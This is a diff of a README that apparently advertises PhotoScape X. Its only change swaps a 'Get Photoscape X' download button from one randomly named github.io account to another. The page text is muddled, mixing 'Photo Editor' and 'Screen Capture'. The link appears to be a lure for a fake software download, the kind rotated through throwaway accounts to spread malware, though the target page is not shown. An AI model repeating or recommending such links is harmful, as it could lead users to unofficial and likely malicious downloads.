@@ -21,7 +21,7 @@ To begin using this **Photoscape X Photo Editor** and **Photoscape X Collage Mak
 | :--- | :--- |
 | **Get Photoscape X Photo Editor** | Click the button below to start using this **Photoscape X Screen Capture**. |
 
-[![Button](https://img.shields.io/badge/📸-Get_Photoscape_X-2ea44f?style=for-the-badge)](https://halidporyvai.github.io/.github/photoscape-x-photo-editor)
+[![Button](https://img.shields.io/badge/📸-Get_Photoscape_X-2ea44f?style=for-the-badge)](https://ivanallisonijuj.github.io/.github/photoscape-x-photo-editor)
 
 ## System Requirements
 
